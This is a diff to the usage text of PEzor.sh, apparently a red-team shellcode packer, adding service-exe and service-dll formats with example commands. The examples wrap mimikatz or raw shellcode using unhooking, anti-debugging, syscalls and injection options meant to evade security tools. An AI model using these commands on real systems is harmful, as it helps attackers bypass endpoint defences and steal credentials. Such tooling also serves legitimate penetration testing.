@@ -81,7 +81,7 @@ OPTIONS
   -text                     Store shellcode in .text section instead of .data
   -self                     Execute the shellcode in the same thread [requires RX shellcode, not compatible with -sgn]
   -sleep=N                  Sleeps for N seconds before unpacking the shellcode
-  -format=FORMAT            Outputs result in specified FORMAT (exe, dll, reflective-dll)
+  -format=FORMAT            Outputs result in specified FORMAT (exe, dll, reflective-dll, service-exe, service-dll)
   [donut args...]           After the executable to pack, you can pass additional Donut args, such as -z 2
 
 EXAMPLES
@@ -89,6 +89,12 @@ EXAMPLES
   $ PEzor.sh -unhook -antidebug -text -self -sleep=120 mimikatz/x64/mimikatz.exe -z 2
   # 64-bit (raw syscalls)
   $ PEzor.sh -sgn -unhook -antidebug -text -syscalls -sleep=120 mimikatz/x64/mimikatz.exe -z 2
+  # 64-bit (reflective dll)
+  $ PEzor.sh -format=reflective-dll mimikatz/x64/mimikatz.exe -z 2 -p '"log c:\users\public\mimi.out" "token::whoami" "exit"'
+  # 64-bit (service exe)
+  $ PEzor.sh -format=service-exe mimikatz/x64/mimikatz.exe -z 2 -p '"log c:\users\public\mimi.out" "token::whoami" "exit"'
+  # 64-bit (service dll)
+  $ PEzor.sh -format=service-dll mimikatz/x64/mimikatz.exe -z 2 -p '"log c:\users\public\mimi.out" "token::whoami" "exit"'
   # 32-bit (self-inject)
   $ PEzor.sh -unhook -antidebug -text -self -sleep=120 mimikatz/Win32/mimikatz.exe -z 2
   # 32-bit (Win32 API: VirtualAlloc/WriteMemoryProcess/CreateRemoteThread)
@@ -119,13 +125,19 @@ OPTIONS
   -text                     Store shellcode in .text section instead of .data
   -self                     Execute the shellcode in the same thread [requires RX shellcode, not compatible with -sgn]
   -sleep=N                  Sleeps for N seconds before unpacking the shellcode
-  -format=FORMAT            Outputs result in specified FORMAT (exe, dll, reflective-dll)
+  -format=FORMAT            Outputs result in specified FORMAT (exe, dll, reflective-dll, service-exe, service-dll)
 
 EXAMPLES
   # 64-bit (self-inject)
   $ PEzor.sh -unhook -antidebug -text -self -sleep=120 shellcode.bin
   # 64-bit (raw syscalls)
   $ PEzor.sh -sgn -unhook -antidebug -text -syscalls -sleep=120 shellcode.bin
+  # 64-bit (reflective dll)
+  $ PEzor.sh -format=reflective-dll shellcode.bin
+  # 64-bit (service exe)
+  $ PEzor.sh -format=service-exe shellcode.bin
+  # 64-bit (service dll)
+  $ PEzor.sh -format=service-dll shellcode.bin
   # 32-bit (self-inject)
   $ PEzor.sh -unhook -antidebug -text -self -sleep=120 shellcode.bin
   # 32-bit (Win32 API: VirtualAlloc/WriteMemoryProcess/CreateRemoteThread)
